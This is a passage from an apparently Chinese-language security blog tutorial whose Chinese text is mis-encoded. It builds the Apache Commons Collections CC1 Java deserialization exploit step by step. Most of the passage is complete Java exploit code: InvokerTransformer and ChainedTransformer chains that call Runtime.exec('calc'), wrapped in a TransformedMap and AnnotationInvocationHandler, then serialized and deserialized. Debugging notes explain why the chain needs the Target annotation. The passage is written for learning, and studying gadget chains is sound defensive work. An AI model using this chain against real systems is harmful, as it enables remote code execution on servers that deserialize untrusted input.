class="hljs-string">&quot;a&quot;</span>);<br>        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br><br>        <span class="hljs-comment">//åå°„è·å–AnnotationInvocationHandler(),å®ä¾‹åŒ–AnnotationInvocationHandlerç±»</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> declaredConstructor.newInstance(Override.class, decorate);<br><br>        <span class="hljs-comment">//åºåˆ—åŒ–ååºåˆ—åŒ–</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é—®é¢˜ä¸€ï¼šRuntimeç±»æ— æ³•åºåˆ—åŒ–"><a href="#é—®é¢˜ä¸€ï¼šRuntimeç±»æ— æ³•åºåˆ—åŒ–" class="headerlink" title="é—®é¢˜ä¸€ï¼šRuntimeç±»æ— æ³•åºåˆ—åŒ–"></a>é—®é¢˜ä¸€ï¼šRuntimeç±»æ— æ³•åºåˆ—åŒ–</h3><p><code>Runtime</code> æ˜¯ä¸èƒ½åºåˆ—åŒ–çš„ï¼Œå› ä¸ºRuntimeç±»æ²¡æœ‰ç»§æ‰¿åºåˆ—åŒ–æ¥å£ java.io.Serializable</p><p>ä½†æ˜¯ <code>Runtime.class</code> æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ï¼ŒClassç±»ç»§æ‰¿äº†åºåˆ—åŒ–æ¥å£ï¼Œæ‰€æœ‰.classæ–‡ä»¶éƒ½å¯ä»¥åºåˆ—åŒ–</p><p>æˆ‘ä»¬å…ˆå†™ä¸€éæ™®é€šåå°„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">problem01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// è·å–Runtimeå®ä¾‹</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) getRuntime.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        exec.invoke(runtime, <span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ç€ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªåå°„çš„ <code>Runtime</code> æ”¹é€ ä¸ºä½¿ç”¨ <code>InvokerTransformer</code> è°ƒç”¨çš„æ–¹å¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">problem01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException &#123;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">        Class c = Runtime.class;</span><br><span class="hljs-comment">        Method getRuntime = c.getMethod(&quot;getRuntime&quot;, null);</span><br><span class="hljs-comment">        // è·å–Runtimeå®ä¾‹</span><br><span class="hljs-comment">        Runtime runtime = (Runtime) getRuntime.invoke(null, null);</span><br><span class="hljs-comment">        Method exec = c.getMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">        exec.invoke(runtime, &quot;calc&quot;);</span><br><span class="hljs-comment">        **/</span><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;<br>        <span class="hljs-comment">//Method getRuntime = c.getMethod(&quot;getRuntime&quot;, null);</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;).transform(c);<br>        <span class="hljs-comment">//è·å–Runtimeå®ä¾‹  Runtime runtime = (Runtime) getRuntime.invoke(null, null);</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;).transform(getRuntimeMethod);<br>        <span class="hljs-comment">//Method exec = c.getMethod(&quot;exec&quot;, String.class);</span><br>        <span class="hljs-comment">//Object exec = new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;exec&quot;, null&#125;).transform(c);</span><br>        <span class="hljs-comment">//åœ¨å®ä¾‹è°ƒç”¨æ–¹æ³•æ‰§è¡Œåå°„</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">transform</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(runtime);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¡ºåˆ©å¼¹å‡ºè®¡ç®—å™¨</p><p>ç¨å¾®ç†ä¸€ç†å¯ä»¥çœ‹åˆ°ï¼Œä¸Šæ–¹ä¸»å‡½æ•°æœ€åä¸‰è¡Œä»£ç æœ‰ä¸€ä¸ªå…±åŒç‚¹å°±æ˜¯ï¼š</p><ul><li>æ ¼å¼éƒ½ä¸º <code>new InvokerTransformer().transform()</code></li><li>åä¸€ä¸ª <code>transform()</code> æ–¹æ³•é‡Œçš„å‚æ•°éƒ½æ˜¯å‰ä¸€ä¸ªçš„ç»“æœ</li></ul><p>ä»ä»£ç çš„å¤ç”¨æ€§è§’åº¦æ¥è¯´ï¼Œæˆ‘ä»¬åº”å½“å‡å°‘è¿™ç§å¤ç”¨çš„å·¥ä½œé‡ï¼Œäºæ˜¯æˆ‘ä»¬ä½¿ç”¨ <code>ChainedTransformer</code> è¿™ä¸ªç±»ã€‚</p><p><img src="/img/CC1/c21.png"></p><p>ChainedTransformerå‡½æ•°ä¼šå°†ä¼ å›çš„æ•°ç»„è¿›è¡Œé€’å½’è°ƒç”¨</p><p><code>ChainedTransformer</code> ç±»ä¸‹çš„ <code>transform</code> æ–¹æ³•é€’å½’è°ƒç”¨äº†å‰ä¸€ä¸ªæ–¹æ³•çš„ç»“æœï¼Œä½œä¸ºåä¸€ä¸ªæ–¹æ³•çš„å‚æ•°ã€‚</p><ul><li>çŸ¥é“äº†ç”¨æ³•ä¹‹åç¼–å†™ EXPï¼Œå…ˆå®šä¹‰ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åå°†æ•°ç»„ä¼ åˆ° <code>ChainedTransformer</code> ç±»ä¸­ï¼Œå†è°ƒç”¨ <code>.transform</code> æ–¹æ³•ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;  <span class="hljs-comment">// åŒ…å£°æ˜ï¼šcom.example</span><br><br><span class="hljs-comment">// å¯¼å…¥å¿…è¦çš„ç±»</span><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;          <span class="hljs-comment">// è½¬æ¢å™¨æ¥å£</span><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;    <span class="hljs-comment">// é“¾å¼è½¬æ¢å™¨</span><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;    <span class="hljs-comment">// åå°„è°ƒç”¨è½¬æ¢å™¨</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CEXP</span> &#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <span class="hljs-comment">// ä¸»æ–¹æ³•</span><br>        <br>        <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªTransformeræ•°ç»„ï¼Œå®šä¹‰æ”»å‡»é“¾çš„æ¯ä¸€æ­¥</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šé€šè¿‡åå°„è·å–Runtimeç±»çš„getRuntimeæ–¹æ³•</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>            <br>            <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šè°ƒç”¨getRuntimeæ–¹æ³•è·å–Runtimeå®ä¾‹</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>            <br>            <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šåœ¨Runtimeå®ä¾‹ä¸Šè°ƒç”¨execæ–¹æ³•æ‰§è¡Œè®¡ç®—å™¨</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">// å°†ä¸‰ä¸ªTransformerç»„åˆæˆé“¾å¼è½¬æ¢å™¨</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <br>        <span class="hljs-comment">// è§¦å‘æ•´ä¸ªæ”»å‡»é“¾ï¼šä»Runtime.classå¼€å§‹ï¼Œæœ€ç»ˆæ‰§è¡Œcalcå‘½ä»¤</span><br>        chainedTransformer.transform(Runtime.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p>å°†æ­¤é“¾ä¸ä¹‹å‰çš„é“¾ç»“åˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">// è§£å†³äº†ç¬¬ä¸€ä¸ªé—®é¢˜</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//å±é™©æ–¹æ³•ï¼Œæ ¸å¿ƒå±é™©å‚æ•°æ„é€ </span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        <span class="hljs-comment">//åå°„è·å–AnnotationInvocationHandler(),å®ä¾‹åŒ–AnnotationInvocationHandlerç±»</span><br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, transformedMap);<br><br>        <span class="hljs-comment">// åºåˆ—åŒ–ååºåˆ—åŒ–</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é—®é¢˜äºŒï¼šå¦‚ä½•è¿›å…¥setValueæ–¹æ³•"><a href="#é—®é¢˜äºŒï¼šå¦‚ä½•è¿›å…¥setValueæ–¹æ³•" class="headerlink" title="é—®é¢˜äºŒï¼šå¦‚ä½•è¿›å…¥setValueæ–¹æ³•"></a>é—®é¢˜äºŒï¼šå¦‚ä½•è¿›å…¥setValueæ–¹æ³•</h3><p>æ­¤æ—¶ç›´æ¥è¿è¡ŒEXPæ˜¯ä¸èƒ½å¼¹å‡ºè®¡ç®—å™¨çš„</p><p>æˆ‘ä»¬åœ¨AnnotationInvocationHandler.javaçš„readObjectç¬¬ä¸€ä¸ªifå¤„ä¸‹ä¸€ä¸ªæ–­ç‚¹è¿›è¡Œè°ƒè¯•æŸ¥çœ‹</p><p><img src="/img/CC1/c22.png"></p><p>è°ƒè¯•æ—¶å‘ç°å¹¶æ²¡æœ‰èµ°å…¥æ¡ä»¶å¾ªç¯ï¼Œè€Œæ˜¯ç›´æ¥è·³å‡ºäº†</p><p>å› ä¸ºåˆ¤æ–­äº†memberTypeä¸ºç©º</p><p><img src="/img/CC1/c23.png"></p><p>æ‰€ä»¥ç¨‹åºæ‰§è¡Œéƒ½å¹¶æœªèµ°å…¥setValueæ–¹æ³•</p><p>éœ€è¦æ»¡è¶³æ¡ä»¶(ä¼ å…¥æ³¨è§£ä¸­éœ€è¦æœ‰æˆå‘˜æ–¹æ³•ï¼Œè®©æˆ‘ä»¬æ„é€ Mapæ—¶å¯ä¼ å…¥å¯¹åº”é”®å€¼å¯¹)</p><ol><li><p>ä¼ å…¥æ³¨è§£ä¸­éœ€è¦æœ‰æˆå‘˜æ–¹æ³•</p><p><img src="/img/CC1/c24.png"></p></li><li><p>å€¼æ˜¯æˆå‘˜ç±»å‹çš„å®ä¾‹(æˆå‘˜æ–¹æ³•åä¸ä¼ å…¥æ•°ç»„çš„é”®ç›¸åŒ)</p><p><code>hashMap.put(&quot;para1&quot;, &quot;para2&quot;)</code> ä¸­çš„ <code>para1</code> ä¸æˆå‘˜å˜é‡ç›¸å¯¹åº”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ç¬¬äºŒä¸ªifæ¡ä»¶</span><br><span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br></code></pre></td></tr></table></figure></li></ol><p>ä½†æˆ‘ä»¬ä¼ å‚æ—¶ä¼ å…¥çš„æ³¨è§£å¹¶æ²¡æœ‰æˆå‘˜</p><p><img src="/img/CC1/c25.png"></p><p>æˆ‘ä»¬æ‰¾åˆ° <code>Target.class</code> ï¼Œç‚¹è¿› <code>Target</code>ï¼Œå½“ä¸­æœ‰ä¸€ä¸ªæˆå‘˜å˜é‡ä¸º <code>value</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬ <code>map.put</code> ä¹Ÿéœ€è¦ä¿®æ”¹ä¸º <code>value</code></p><p>æ­¤æ³¨è§£æœ‰æˆå‘˜æ–¹æ³•</p><p><img src="/img/CC1/c26.png"></p><p>ä¿®æ”¹å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span 